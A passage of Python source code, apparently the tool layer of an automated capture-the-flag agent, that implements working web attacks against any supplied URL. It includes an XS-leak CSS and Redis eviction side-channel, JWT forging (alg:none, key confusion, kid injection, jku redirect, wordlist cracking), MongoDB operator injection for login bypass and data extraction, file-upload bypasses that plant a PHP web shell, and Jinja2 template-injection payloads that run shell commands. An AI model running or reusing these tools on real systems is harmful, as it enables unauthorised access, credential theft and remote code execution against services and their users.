                    "text": r.read().decode(errors="replace"),
                    "content": r.read(),
                    "headers": dict(r.headers)
                })()
        except Exception as ex:
            return type("R", (), {"status_code": 0, "text": str(ex), "content": b"", "headers": {}})()

    if operation == "discover":
        found = []
        for path in SPEC_PATHS:
            url = base + path
            r = _get(url)
            ct = getattr(r, "headers", {}).get("content-type", "") or ""
            if r.status_code in (200, 206):
                preview = (r.text if hasattr(r, "text") else "")[:200]
                found.append(f"[{r.status_code}] {url}\n    Content-Type: {ct}\n    Preview: {preview!r}")
        return "\n\n".join(found) if found else f"No spec endpoints found on {base}"

    if operation == "parse_spec":
        # Find spec first
        spec = None
        for path in SPEC_PATHS[:8]:
            r = _get(base + path)
            if r.status_code == 200:
                try:
                    spec = json.loads(r.text)
                    break
                except:
                    try:
                        import yaml
                        spec = yaml.safe_load(r.text)
                        break
                    except: pass
        if not spec:
            return "No parseable spec found — run discover first"
        paths = spec.get("paths", {})
        lines = [f"Spec: {spec.get('info',{}).get('title','?')} v{spec.get('info',{}).get('version','?')}",
                 f"Total endpoints: {len(paths)}"]
        for p, methods_obj in sorted(paths.items()):
            for m, detail in (methods_obj or {}).items():
                summary = (detail or {}).get("summary", "") if isinstance(detail, dict) else ""
                lines.append(f"  {m.upper():6} {p}  — {summary}")
        return "\n".join(lines)

    if operation == "test_all":
        spec = None
        for path in SPEC_PATHS[:8]:
            r = _get(base + path)
            if r.status_code == 200:
                try: spec = json.loads(r.text); break
                except: pass
        if not spec:
            return "No parseable spec found — run discover first"
        paths = list(spec.get("paths", {}).keys())
        results = []
        for p in paths[:50]:  # cap at 50 endpoints
            url = base + p
            r = _get(url)
            ct = getattr(r, "headers", {}).get("content-type", "") or ""
            preview = (r.text if hasattr(r, "text") else "")[:300]
            interesting = any(kw in preview.lower() for kw in
                              ["flag","ctf","secret","password","token","key","heap","dump","env"])
            tag = " *** INTERESTING ***" if interesting else ""
            results.append(f"[{r.status_code}] GET {url}{tag}\n    {ct}\n    {preview!r}")
        return "\n\n".join(results)

    if operation == "download_artifact":
        if not endpoint:
            return "Provide endpoint= (e.g. /actuator/heapdump)"
        out = output_path or f"/tmp/artifact_{int(time.time())}.bin"
        url = base + endpoint
        try:
            import requests
            r = requests.get(url, headers=hdrs, cookies=cks,
                             timeout=60, verify=False, stream=True)
            total = 0
            with open(out, "wb") as f:
                for chunk in r.iter_content(65536):
                    f.write(chunk); total += len(chunk)
            log("sys", f"[swagger_fuzz] downloaded {total} bytes → {out}", "dim")
            # quick flag scan
            grep = _shell(f"strings '{out}' | grep -iE 'picoCTF|flag{{|ctf{{' | head -20", timeout=10)
            return f"Downloaded {total} bytes → {out}\nFlag scan:\n{grep}"
        except Exception as ex:
            return f"Download error: {ex}"

    return "Operations: discover, parse_spec, test_all, download_artifact"


def tool_xs_leak(target_url: str, operation: str = "css_oracle",
                 secret_endpoint: str = "/secret",
                 secret_attr: str = "secret",
                 charset: str = "0123456789abcdef",
                 secret_len: int = 32,
                 upload_endpoint: str = "/upload",
                 visit_endpoint: str = "/visit",
                 output: dict = None) -> str:
    """XS-Leak and CSS injection oracle for information leakage challenges.
    Covers picoCTF 2026 Paper-2 (CSS attribute selector + Redis LRU side-channel)
    and elements-2024 (frame-count oracle).
    Ops: css_oracle (generate CSS payload with attribute selectors for all charset combos),
    lru_setup (upload marker files + prefill garbage to approach Redis memory limit),
    lru_flood (flood Redis with garbage files to trigger LRU eviction),
    lru_probe (probe all marker IDs — 200=survived/touched, 404=evicted/untouched),
    reconstruct (beam-search + LLR scoring to recover secret from survived markers),
    frame_count (count iframes/embeds visible — oracle for CSP frame injection),
    error_oracle (probe list of URLs, classify 200 vs 4xx as oracle bit),
    full_pipeline (orchestrate the complete CSS+LRU attack end-to-end)."""

    import threading, math
    base = target_url.rstrip("/")

    def _upload(data: bytes, content_type: str = "text/css"):
        try:
            import requests as _r
            r = _r.post(f"{base}{upload_endpoint}",
                        files={"file": ("f.css", data, content_type)},
                        timeout=10, verify=False, allow_redirects=False)
            loc = r.headers.get("location", "")
            paper_id = loc.rstrip("/").split("/")[-1] if loc else ""
            return paper_id
        except Exception as ex:
            return f"err:{ex}"

    def _get(url, timeout=3):
        try:
            import requests as _r
            r = _r.get(url, timeout=timeout, verify=False)
            return r.status_code
        except: return 0

    if operation == "css_oracle":
        """Generate CSS payload that uses attribute selectors to probe every n-gram in charset."""
        n = 2  # bigrams by default; try trigrams too
        combos = []
        for a in charset:
            for b in charset:
                combos.append(a + b)
        # Build CSS with custom-property trick (each selector sets a var, trigger div reads all)
        lines = []
        var_list = []
        for combo in combos:
            var = f"--m-{combo}"
            selector = f'body[{secret_attr}*="{combo}"]'
            url_ref = f"/paper/MARKER_{combo}"  # placeholder — replace with real IDs
            lines.append(f'{selector} {{ {var}: url("{url_ref}"); }}')
            var_list.append(f"var({var}, none)")
        # Prefix selectors
        for c in charset:
            for c2 in charset:
                combo = c + c2
                var = f"--px-{combo}"
                lines.append(f'body[{secret_attr}^="{combo}"] {{ {var}: url("/paper/PREFIX_{combo}"); }}')
                var_list.append(f"var({var}, none)")
        # Trigger div
        lines.append(f'#trig {{ background-image: {", ".join(var_list[:50])}; }}')
        css = "\n".join(lines)
        log("sys", f"[xs_leak] Generated CSS with {len(combos)} bigram selectors ({len(css)} bytes)", "dim")
        return (f"Generated CSS ({len(css)} bytes, {len(combos)} selectors)\n"
                "First 10 lines:\n" + "\n".join(lines[:10]) + "\n...\n"
                "[Full CSS in memory — use upload op to deploy]")

    if operation == "lru_setup":
        """Upload marker files for all charset n-grams + prefill garbage to approach memory limit."""
        results = {"markers": {}, "css_ids": [], "launcher_id": ""}
        n_garbage = output.get("n_prefill", 800) if output else 800
        marker_size = output.get("marker_size", 512) if output else 512

        log("sys", f"[xs_leak] Uploading {len(charset)**2} markers + {n_garbage} garbage files", "dim")

        # Upload markers
        for a in charset:
            for b in charset:
                combo = a + b
                marker_data = (f"<!-- marker {combo} -->" * (marker_size // 20)).encode()
                pid = _upload(marker_data, "text/html")
                results["markers"][combo] = pid

        # Upload garbage to approach memory limit
        garbage = b"G" * 60000  # ~60KB per file
        for i in range(n_garbage):
            _upload(garbage, "text/plain")
            if i % 100 == 0:
                log("sys", f"[xs_leak] Prefill {i}/{n_garbage}", "dim")

        log("sys", f"[xs_leak] Setup complete: {len(results['markers'])} markers uploaded", "dim")
        return json.dumps(results, indent=2)

    if operation == "lru_flood":
        """Flood with garbage to trigger LRU eviction after bot visit."""
        n_flood = output.get("n_flood", 300) if output else 300
        garbage = b"F" * 60000
        log("sys", f"[xs_leak] Flooding with {n_flood} garbage files", "dim")
        for i in range(n_flood):
            _upload(garbage, "text/plain")
        return f"Flooded with {n_flood} files"

    if operation == "lru_probe":
        """Probe all marker paper IDs — 200=survived (CSS matched), 404=evicted."""
        marker_ids = output.get("markers", {}) if output else {}
        if not marker_ids:
            return "Provide output={'markers': {'ab': 'paper_id', ...}}"
        survived = {}
        from concurrent.futures import ThreadPoolExecutor
        def check(item):
            combo, pid = item
            status = _get(f"{base}/paper/{pid}", timeout=2)
            return combo, status == 200
        with ThreadPoolExecutor(max_workers=200) as ex:
            for combo, hit in ex.map(check, marker_ids.items()):
                if hit: survived[combo] = True
        log("sys", f"[xs_leak] Probe: {len(survived)}/{len(marker_ids)} survived", "dim")
        return json.dumps({"survived": list(survived.keys()), "total": len(marker_ids)})

    if operation == "reconstruct":
        """Beam-search reconstruction of secret from survived bigrams/trigrams."""
        survived_set = set(output.get("survived", [])) if output else set()
        cs = charset
        n = secret_len
        beam_width = 3000

        if not survived_set:
            return "Provide output={'survived': ['ab','cd',...], 'charset': '0123456789abcdef', 'secret_len': 32}"

        # Score each n-gram
        def score(cand):
            s = 0.0
            for i in range(len(cand) - 1):
                bg = cand[i:i+2]
                if bg in survived_set: s += 1.0
            for i in range(len(cand) - 2):
                tg = cand[i:i+3]
                if tg in survived_set: s += 2.0
            return s

        # Beam search
        beam = [(c1+c2, score(c1+c2)) for c1 in cs for c2 in cs]
        beam.sort(key=lambda x: -x[1])
        beam = beam[:beam_width]

        for step in range(n - 2):
            next_beam = []
            for cand, sc in beam:
                for c in cs:
                    new = cand + c
                    new_sc = sc
                    # add new bigram
                    bg = new[-2:]
                    if bg in survived_set: new_sc += 1.0
                    # add new trigram
                    if len(new) >= 3:
                        tg = new[-3:]
                        if tg in survived_set: new_sc += 2.0
                    next_beam.append((new, new_sc))
            next_beam.sort(key=lambda x: -x[1])
            beam = next_beam[:beam_width]
            if step % 5 == 0:
                log("sys", f"[xs_leak] Beam step {step+3}/{n}: top={beam[0][0][:10]}... score={beam[0][1]:.1f}", "dim")

        top = beam[:10]
        result_lines = [f"Top {len(top)} candidates:"]
        for i, (cand, sc) in enumerate(top):
            result_lines.append(f"  [{i+1}] {cand}  (score={sc:.1f})")
        return "\n".join(result_lines)

    if operation == "full_pipeline":
        return """Full CSS+LRU pipeline for picoCTF 2026 Paper-2 style challenges:
1. xs_leak(target, 'lru_setup')       → get marker_ids dict
2. Build CSS with css_oracle output   → upload CSS bundles
3. Build launcher HTML (meta refresh → /secret?payload=<link> tags)
4. Trigger bot: GET /visit/<launcher_id>
5. Wait 10s for CSS to eval
6. xs_leak(target, 'lru_flood')       → evict untouched markers
7. xs_leak(target, 'lru_probe', output=marker_ids) → survived set
8. xs_leak(target, 'reconstruct', output={survived:...}) → candidates
9. Submit top candidate to /flag endpoint
Note: Use concurrent_requests for parallel uploads in steps 1+3."""

    if operation == "error_oracle":
        """Probe URL list, classify by status code."""
        urls = output.get("urls", []) if output else []
        if not urls: return "Provide output={'urls': [...]}"
        hits = []
        from concurrent.futures import ThreadPoolExecutor
        def check_url(u):
            return u, _get(u, timeout=3)
        with ThreadPoolExecutor(max_workers=100) as ex:
            for url, status in ex.map(check_url, urls):
                hits.append({"url": url, "status": status})
        return json.dumps(hits[:50])

    if operation == "frame_count":
        """Count visible iframes/embeds in a page (requires browser_agent)."""
        return tool_browser_agent(
            target_url,
            """
const frames = document.querySelectorAll('iframe, embed, object, frame');
console.log('FRAME_COUNT:' + frames.length);
for(let f of frames) {
    try { console.log('FRAME_SRC:' + f.src); } catch(e) {}
}
""",
            timeout=15
        )

    return "Operations: css_oracle, lru_setup, lru_flood, lru_probe, reconstruct, full_pipeline, error_oracle, frame_count"


def tool_jwt_forge(token: str = "", operation: str = "analyze",
                   pubkey_path: str = "", secret: str = "",
                   attacker_url: str = "", kid: str = "/dev/null",
                   payload_overrides: dict = None,
                   wordlist: str = "/usr/share/wordlists/rockyou.txt") -> str:
    """JWT attack toolkit wrapping jwt_tool (github.com/ticarpi/jwt_tool).
    Ops: analyze (decode + show header/payload/signature),
    alg_none (forge with alg:none — no signature needed),
    rs256_hs256 (RS256 to HS256 confusion — sign with public key as HMAC secret),
    kid_injection (kid header path traversal to /dev/null or known file),
    jku_redirect (jku/x5u header pointing to attacker-controlled JWKS),
    crack (brute-force HS256 secret with wordlist),
    forge (create new token with custom payload + secret)."""

    def _jwt_tool(args):
        for cmd in ["jwt_tool", "python3 /opt/jwt_tool/jwt_tool.py",
                    "python3 ~/jwt_tool/jwt_tool.py"]:
            result = _shell(f"{cmd} {args} 2>&1", timeout=30)
            if "not found" not in result and "No such" not in result:
                return result
        return None

    if operation == "analyze":
        if not token: return "Provide token="
        # Try jwt_tool first, then PyJWT
        r = _jwt_tool(f"'{token}' -d")
        if r: return r
        code = f"""
import base64, json
tok = {repr(token)}
parts = tok.split('.')
if len(parts) < 2:
    print('Invalid JWT format')
else:
    def b64d(s):
        s += '=='*((4-len(s)%4)%4)
        return base64.urlsafe_b64decode(s)
    header  = json.loads(b64d(parts[0]))
    payload = json.loads(b64d(parts[1]))
    print('Header:', json.dumps(header, indent=2))
    print('Payload:', json.dumps(payload, indent=2))
    print('Signature (b64):', parts[2][:40]+'...' if len(parts)>2 else 'none')
"""
        return tool_execute_python(code, timeout=5)

    if operation == "alg_none":
        if not token: return "Provide token="
        r = _jwt_tool(f"'{token}' -X a")
        if r: return r
        code = f"""
import base64, json, re
tok = {repr(token)}
parts = tok.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0]+'=='))
payload_bytes = base64.urlsafe_b64decode(parts[1]+'==')
payload = json.loads(payload_bytes)

# Apply overrides
overrides = {repr(payload_overrides or {{}})}
payload.update(overrides)

# Forge with alg:none
header['alg'] = 'none'
h = base64.urlsafe_b64encode(json.dumps(header,separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).rstrip(b'=').decode()
forged = f'{{h}}.{{p}}.'
print(f'Forged (alg:none): {{forged}}')
# Also try with empty signature
print(f'With empty sig: {{forged}}')
"""
        return tool_execute_python(code, timeout=5)

    if operation == "rs256_hs256":
        if not token or not pubkey_path: return "Provide token= and pubkey_path="
        r = _jwt_tool(f"'{token}' -X k -pk '{pubkey_path}'")
        if r: return r
        code = f"""
import base64, json
from Crypto.PublicKey import RSA
from Crypto.Hash import HMAC, SHA256

tok = {repr(token)}
parts = tok.split('.')
with open({repr(pubkey_path)}, 'rb') as f: pubkey = f.read()

# Change alg to HS256
header = json.loads(base64.urlsafe_b64decode(parts[0]+'=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1]+'=='))
overrides = {repr(payload_overrides or {{}})}
payload.update(overrides)
header['alg'] = 'HS256'

h = base64.urlsafe_b64encode(json.dumps(header,separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).rstrip(b'=').decode()
msg = f'{{h}}.{{p}}'.encode()
sig = HMAC.new(pubkey, msg, SHA256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f'Forged RS256→HS256: {{h}}.{{p}}.{{sig_b64}}')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "kid_injection":
        if not token: return "Provide token="
        r = _jwt_tool(f"'{token}' -I -hc kid -hv '{kid}'")
        if r: return r
        code = f"""
import base64, json, hmac, hashlib
tok = {repr(token)}
kid_val = {repr(kid)}
parts = tok.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0]+'=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1]+'=='))
overrides = {repr(payload_overrides or {{}})}
payload.update(overrides)
header['kid'] = kid_val
# Sign with empty string (for /dev/null kid) or key=''
secret = b''
h = base64.urlsafe_b64encode(json.dumps(header,separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).rstrip(b'=').decode()
msg = f'{{h}}.{{p}}'.encode()
sig = hmac.new(secret, msg, hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f'kid injection ({repr(kid_val)}): {{h}}.{{p}}.{{sig_b64}}')
"""
        return tool_execute_python(code, timeout=5)

    if operation == "jku_redirect":
        if not token or not attacker_url: return "Provide token= and attacker_url= (JWKS endpoint)"
        r = _jwt_tool(f"'{token}' -X s -ju '{attacker_url}'")
        if r: return r
        return (f"jwt_tool not installed. Install: pip install jwt-tool\n"
                f"Manual: modify header to add jku={repr(attacker_url)} and host JWKS at that URL")

    if operation == "crack":
        if not token: return "Provide token="
        r = _jwt_tool(f"'{token}' -C -d '{wordlist}'")
        if r: return r
        code = f"""
import base64, json, hmac, hashlib
tok = {repr(token)}
wl = {repr(wordlist)}
parts = tok.split('.')
msg = f'{{parts[0]}}.{{parts[1]}}'.encode()
target_sig = base64.urlsafe_b64decode(parts[2]+'==')
print(f'Cracking HS256 with {{wl}}...')
tried = 0
try:
    with open(wl, 'r', errors='replace') as f:
        for line in f:
            secret = line.strip().encode()
            sig = hmac.new(secret, msg, hashlib.sha256).digest()
            if sig == target_sig:
                print(f'[+] SECRET FOUND: {{repr(line.strip())}}')
                break
            tried += 1
            if tried % 100000 == 0:
                print(f'  {{tried}} tried...')
    else:
        print(f'Secret not found in wordlist ({{tried}} tried)')
except FileNotFoundError:
    print(f'Wordlist not found: {{wl}}')
"""
        return tool_execute_python(code, timeout=120)

    if operation == "forge":
        if not token: return "Provide token="
        overrides = payload_overrides or {}
        code = f"""
import base64, json, hmac, hashlib
tok = {repr(token)}
secret = {repr(secret)}.encode()
overrides = {repr(overrides)}
parts = tok.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0]+'=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1]+'=='))
payload.update(overrides)
h = base64.urlsafe_b64encode(json.dumps(header,separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).rstrip(b'=').decode()
msg = f'{{h}}.{{p}}'.encode()
sig = hmac.new(secret, msg, hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f'Forged token: {{h}}.{{p}}.{{sig_b64}}')
print(f'Payload: {{json.dumps(payload, indent=2)}}')
"""
        return tool_execute_python(code, timeout=5)

    return "Operations: analyze, alg_none, rs256_hs256, kid_injection, jku_redirect, crack, forge"


def tool_nosql_inject(target_url: str, operation: str = "probe",
                       param: str = "username", password_param: str = "password",
                       method: str = "POST", charset: str = "0123456789abcdefghijklmnopqrstuvwxyz_-{}",
                       headers: dict = None, cookies: dict = None,
                       field: str = "username", data_format: str = "form") -> str:
    """NoSQL (MongoDB) injection tester wrapping NoSQLMap + custom operators.
    Ops: probe (test if endpoint is vulnerable to MongoDB operator injection),
    auth_bypass (attempt $ne/$gt/$regex auth bypass to login without credentials),
    extract_field (extract field values char-by-char using $regex injection),
    js_inject (test MongoDB $where JavaScript injection),
    nosqlmap (shell to NoSQLMap tool for full scan)."""

    hdrs = headers or {}
    cks  = cookies or {}

    def _post(data):
        code = f"""
import requests, json, urllib3
urllib3.disable_warnings()
url = {repr(target_url)}
hdrs = {repr(hdrs)}
cks = {repr(cks)}
data = {repr(data)}
method = {repr(method)}
fmt = {repr(data_format)}
try:
    if method == 'POST':
        if fmt == 'json':
            r = requests.post(url, json=data, headers=hdrs, cookies=cks, timeout=8, verify=False)
        else:
            r = requests.post(url, data=data, headers=hdrs, cookies=cks, timeout=8, verify=False)
    else:
        r = requests.get(url, params=data, headers=hdrs, cookies=cks, timeout=8, verify=False)
    print(f'{{r.status_code}} {{len(r.text)}} {{r.text[:200]}}')
except Exception as ex:
    print(f'Error: {{ex}}')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "probe":
        # Test basic operator injection
        results = []
        tests = [
            {param: {"$ne": ""}, password_param: {"$ne": ""}},
            {param: {"$gt": ""}, password_param: {"$gt": ""}},
            {param: "admin", password_param: {"$ne": "wrong"}},
            {param: {"$regex": ".*"}, password_param: {"$ne": ""}},
        ]
        for t in tests:
            r = _post(t)
            results.append(f"payload={t} → {r[:100]}")
        return "\n".join(results)

    if operation == "auth_bypass":
        code = f"""
import requests, json, urllib3
urllib3.disable_warnings()
url = {repr(target_url)}
hdrs = {repr(hdrs)}
cks  = {repr(cks)}
fmt  = {repr(data_format)}

bypasses = [
    {{'{param}': {{'$ne': ''}}, '{password_param}': {{'$ne': ''}}}},
    {{'{param}': {{'$gt': ''}}, '{password_param}': {{'$gt': ''}}}},
    {{'{param}': 'admin', '{password_param}': {{'$ne': 'x'}}}},
    {{'{param}': {{'$regex': '.*'}}, '{password_param}': {{'$ne': ''}}}},
    {{'{param}': {{'$exists': True}}, '{password_param}': {{'$exists': True}}}},
]

for b in bypasses:
    try:
        if fmt == 'json':
            r = requests.post(url, json=b, headers=hdrs, cookies=cks, timeout=8, verify=False)
        else:
            r = requests.post(url, data=b, headers=hdrs, cookies=cks, timeout=8, verify=False)
        success = r.status_code in (200,302) and 'wrong' not in r.text.lower() and 'invalid' not in r.text.lower()
        tag = '[BYPASS?]' if success else '[fail]'
        print(f'{{tag}} {{b}} → {{r.status_code}} {{r.text[:80]}}')
    except Exception as ex:
        print(f'[err] {{ex}}')
"""
        return tool_execute_python(code, timeout=30)

    if operation == "extract_field":
        code = f"""
import requests, urllib3, time
urllib3.disable_warnings()
url = {repr(target_url)}
field = {repr(field)}
charset = {repr(charset)}
hdrs = {repr(hdrs)}
cks  = {repr(cks)}
fmt  = {repr(data_format)}

def test_prefix(prefix):
    payload = {{'{param}': {{'$regex': f'^{{prefix}}'}}, '{password_param}': {{'$ne': 'x'}}}}
    try:
        if fmt == 'json':
            r = requests.post(url, json=payload, headers=hdrs, cookies=cks, timeout=5, verify=False)
        else:
            r = requests.post(url, data=payload, headers=hdrs, cookies=cks, timeout=5, verify=False)
        return r.status_code == 200 and 'wrong' not in r.text.lower()
    except: return False

found = ''
for pos in range(32):
    for c in charset:
        if test_prefix(found + c):
            found += c
            print(f'[+] {{field}} starts with: {{found}}')
            break
    else:
        print(f'Extraction complete: {{found}}')
        break
"""
        return tool_execute_python(code, timeout=120)

    if operation == "js_inject":
        code = f"""
import requests, urllib3
urllib3.disable_warnings()
url = {repr(target_url)}
hdrs = {repr(hdrs)}
cks  = {repr(cks)}

tests = [
    {{'{param}': {{'$where': 'this.username == this.username'}}, '{password_param}': 'x'}},
    {{'{param}': {{'$where': '1==1'}}, '{password_param}': 'x'}},
    {{'{param}': {{'$where': 'sleep(2000)'}}, '{password_param}': 'x'}},
]
for t in tests:
    import time
    t0 = time.time()
    try:
        r = requests.post(url, json=t, headers=hdrs, cookies=cks, timeout=10, verify=False)
        elapsed = time.time() - t0
        print(f'{{t}} → {{r.status_code}} {{elapsed:.2f}}s {{r.text[:80]}}')
    except Exception as ex:
        print(f'Error: {{ex}}')
"""
        return tool_execute_python(code, timeout=30)

    if operation == "nosqlmap":
        result = _shell(f"python3 nosqlmap.py --attack 0 --victim {target_url} 2>&1 | head -40", timeout=60)
        if "not found" in result:
            return ("NoSQLMap not installed.\nInstall: git clone https://github.com/codingo/NoSQLMap\n"
                    "pip install -r requirements.txt\nFallback: use operation=auth_bypass or extract_field")
        return result

    return "Operations: probe, auth_bypass, extract_field, js_inject, nosqlmap"


def tool_file_upload(target_url: str, operation: str = "probe",
                      upload_param: str = "file", code_param: str = "",
                      code_content: str = "", filename: str = "test.php",
                      output_dir: str = "/tmp/upload_test",
                      headers: dict = None, cookies: dict = None) -> str:
    """File upload exploitation — MIME spoofing, double extension, .htaccess, polyglot.
    Ops: probe (try multiple upload bypass techniques and check which succeed),
    mime_spoof (upload with mismatched Content-Type header),
    double_ext (upload file.php.jpg — double extension bypass),
    htaccess (upload .htaccess to enable PHP in image dir),
    null_byte (filename null byte injection — file.php%00.jpg),
    fuxploider (shell to fuxploider for automated bypass detection)."""

    hdrs = headers or {}
    cks  = cookies or {}
    _shell(f"mkdir -p '{output_dir}'")

    def _upload(fname, content, content_type):
        code = f"""
import requests, urllib3
urllib3.disable_warnings()
url = {repr(target_url)}
hdrs = {repr(hdrs)}
cks  = {repr(cks)}
files = {{'{upload_param}': ({repr(fname)}, {repr(content)}, {repr(content_type)})}}
try:
    r = requests.post(url, files=files, headers=hdrs, cookies=cks, timeout=10, verify=False)
    print(f'{{r.status_code}} {{r.text[:200]}}')
except Exception as ex:
    print(f'Error: {{ex}}')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "probe":
        results = []
        test_content = b"<?php phpinfo(); ?>"
        tests = [
            ("test.php",      "image/jpeg"),
            ("test.php.jpg",  "image/jpeg"),
            ("test.pHp",      "image/jpeg"),
            ("test.php5",     "application/octet-stream"),
            (".htaccess",     "text/plain"),
            ("test.php\x00.jpg", "image/jpeg"),
        ]
        for fname, ct in tests:
            r = _upload(fname, test_content, ct)
            results.append(f"[{fname}] ({ct}) → {r[:80]}")
        return "\n".join(results)

    if operation == "mime_spoof":
        r = _upload(filename, code_content.encode() if code_content else b"<?php system($_GET['cmd']); ?>", "image/jpeg")
        return f"Uploaded {filename} with image/jpeg content-type:\n{r}"

    if operation == "double_ext":
        fname = filename if "." in filename else filename + ".php.jpg"
        if not fname.endswith(".php.jpg") and ".php" in fname:
            base = fname.rsplit(".", 1)[0]
            fname = base + ".jpg"
        r = _upload(fname, code_content.encode() if code_content else b"<?php system($_GET['cmd']); ?>", "image/jpeg")
        return f"Uploaded {fname}:\n{r}"

    if operation == "htaccess":
        htaccess_content = b"AddType application/x-httpd-php .jpg\nAddType application/x-httpd-php .png"
        r = _upload(".htaccess", htaccess_content, "text/plain")
        return f".htaccess upload result:\n{r}"

    if operation == "null_byte":
        fname = filename.replace(".jpg", ".php\x00.jpg") if ".jpg" in filename else filename + ".php\x00.jpg"
        r = _upload(fname, code_content.encode() if code_content else b"<?php system($_GET['cmd']); ?>", "image/jpeg")
        return f"Null byte upload ({repr(fname)}):\n{r}"

    if operation == "fuxploider":
        result = _shell(f"fuxploider --url '{target_url}' --not-ssl 2>&1 | head -50", timeout=60)
        if "not found" in result:
            return ("fuxploider not installed.\nInstall: pip install fuxploider\n"
                    "Or: git clone https://github.com/almandin/fuxploider\n"
                    "Fallback: use operation=probe for manual testing")
        return result

    return "Operations: probe, mime_spoof, double_ext, htaccess, null_byte, fuxploider"


def tool_template_inject(target_url: str = "", operation: str = "probe",
                          param: str = "input", method: str = "GET",
                          engine: str = "auto", headers: dict = None,
                          cookies: dict = None, data: str = "") -> str:
    """SSTI blind probe + filter bypass wrapping tplmap.
    Ops: probe (comprehensive SSTI detection across all engines),
    blind_probe (boolean-based blind SSTI when output is filtered),
    tplmap (shell to tplmap for full automation + RCE),
    filter_bypass (Jinja2/Twig payloads that avoid common WAF filters),
    polyglot (single probe that triggers multiple engines simultaneously)."""

    hdrs = headers or {}
    cks  = cookies or {}

    if operation == "tplmap":
        result = _shell(
            f"python3 /opt/tplmap/tplmap.py -u '{target_url}' -d '{param}=*' 2>&1 | head -60",
            timeout=60)
        if "not found" in result or "No such" in result:
            result = _shell("tplmap 2>&1 | head -5", timeout=5)
        if "not found" in result or "No such" in result:
            return ("tplmap not installed.\nInstall: git clone https://github.com/epinna/tplmap\n"
                    "Fallback: use operation=probe for manual detection")
        return result

    if operation in ("probe", "blind_probe"):
        # Delegate to existing ssti_rce for the probe
        return tool_ssti_rce(
            operation="detect",
            engine="auto",
            target_url=target_url,
            param=param,
            method=method,
            headers=headers,
            cookies=cookies
        )

    if operation == "filter_bypass":
        code = f"""
import requests, urllib3, json
urllib3.disable_warnings()
url = {repr(target_url)}
param = {repr(param)}
method = {repr(method)}
hdrs = {repr(hdrs)}
cks  = {repr(cks)}

# Filter-bypass payloads for Jinja2 without underscores/dots/brackets
bypass_payloads = [
    # No underscores - use |attr() filter
    "{{% set x = request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f') %}}{{% set y = x|attr('\\x5f\\x5fbuiltins\\x5f\\x5f') %}}{{% set z = y|attr('\\x5f\\x5fimport\\x5f\\x5f') %}}{{% set os = z('os') %}}{{{{os.popen('id').read()}}}}",
    # Using request.args
    "{{{{request['application']['__globals__']['__builtins__']['__import__']('os').popen('id').read()}}}}",
    # lipsum global
    "{{{{lipsum['__globals__']['os']['popen']('id')['read']()}}}}",
    # cycler
    "{{{{cycler.__init__.__globals__.os.popen('id').read()}}}}",
    # joiner
    "{{{{joiner.__init__.__globals__.os.popen('id').read()}}}}",
    # namespace
    "{{{{namespace.__init__.__globals__.os.popen('id').read()}}}}",
]

for p in bypass_payloads[:3]:
    try:
        if method == 'GET':
            r = requests.get(url, params={{param: p}}, headers=hdrs, cookies=cks, timeout=8, verify=False)
        else:
            r = requests.post(url, data={{param: p}}, headers=hdrs, cookies=cks, timeout=8, verify=False)
        uid_hit = 'uid=' in r.text or 'root' in r.text
        print(f'[{{"HIT" if uid_hit else "miss"}}] {{p[:60]}} → {{r.status_code}} {{r.text[:100]}}')
    except Exception as ex:
        print(f'[err] {{ex}}')
"""
        return tool_execute_python(code, timeout=30)

    if operation == "polyglot":
        # Single probe that triggers Jinja2, Twig, Freemarker simultaneously
        probe = "{{7*7}}${7*7}#{7*7}*{7*7}@(7*7)"
        code = f"""
import requests, urllib3
urllib3.disable_warnings()
url = {repr(target_url)}
probe = {repr(probe)}
param = {repr(param)}
method = {repr(method)}
hdrs = {repr(hdrs)}
cks  = {repr(cks)}

if method == 'GET':
    r = requests.get(url, params={{param: probe}}, headers=hdrs, cookies=cks, timeout=8, verify=False)
else:
    r = requests.post(url, data={{param: probe}}, headers=hdrs, cookies=cks, timeout=8, verify=False)

import re
found = re.findall(r'\\b49\\b', r.text)
print(f'Polyglot probe response (status={{r.status_code}}):')
print(r.text[:300])
if found:
    print(f'[!] "49" (7*7) found in response — SSTI CONFIRMED')
"""
        return tool_execute_python(code, timeout=10)

    return "Operations: probe, blind_probe, tplmap, filter_bypass, polyglot"

